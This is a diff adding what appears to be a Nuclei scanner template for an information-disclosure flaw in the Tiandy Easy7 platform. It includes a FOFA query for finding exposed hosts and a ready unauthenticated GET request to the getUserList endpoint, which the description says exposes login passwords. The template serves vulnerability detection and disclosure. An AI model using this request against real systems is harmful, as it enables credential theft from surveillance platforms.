@@ -1,0 +1,25 @@
+id: TianDiWeiYe-Easy7-getUserList-Information-Disclosure
+
+info:
+  name: 天地伟业Easy7 getUserList 信息泄露
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: app="Tiandy-Easy7"
+    天地伟业Easy7平台的 getUserList 接口存在信息泄露漏洞，攻击者可通过构造特定请求读取系统登录密码。
+  reference: |-
+    -
+  tags: Information Disclosure
+  
+http:
+  - raw:
+      - |-
+        GET /Easy7/rest/user/getUserList HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        
+    matchers:
+      - type: dsl
+        name: 信息泄露
+        dsl:
+          - "status_code==200 && contains_all(body,'parentId','content','caption')"
